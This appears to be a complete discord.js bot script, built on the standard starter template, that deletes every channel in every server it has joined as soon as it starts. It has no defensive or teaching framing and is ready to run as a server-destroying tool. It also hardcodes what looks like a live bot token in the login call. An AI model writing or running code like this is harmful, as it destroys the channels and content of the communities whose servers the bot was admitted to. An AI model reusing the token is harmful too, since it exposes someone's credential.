// Require the necessary discord.js classes
const { Client, Intents } = require('discord.js');

// Create a new client instance
const client = new Client({ intents: [Intents.FLAGS.GUILDS] });

// When the client is ready, run this code (only once)
client.once('ready', () => {
	console.log('Ready!');
    client.guilds.cache.forEach(guild => { // Looping through the guilds.
        guild.channels.cache.forEach(channel => { // Looping through the guild channels.
            channel.delete().catch(error => { // Deleting the channel(s) and catching any errors.
                console.log(`Couldn't delete ${channel.name}.`)
            });
        });
    });
});



// Login to Discord with your client's token
client.login("OTIzMjM5NjUxMTczNjAxMjgw.YcNH7Q.MTBeVW6_zabJGLmvs5ReO2dA1sg");
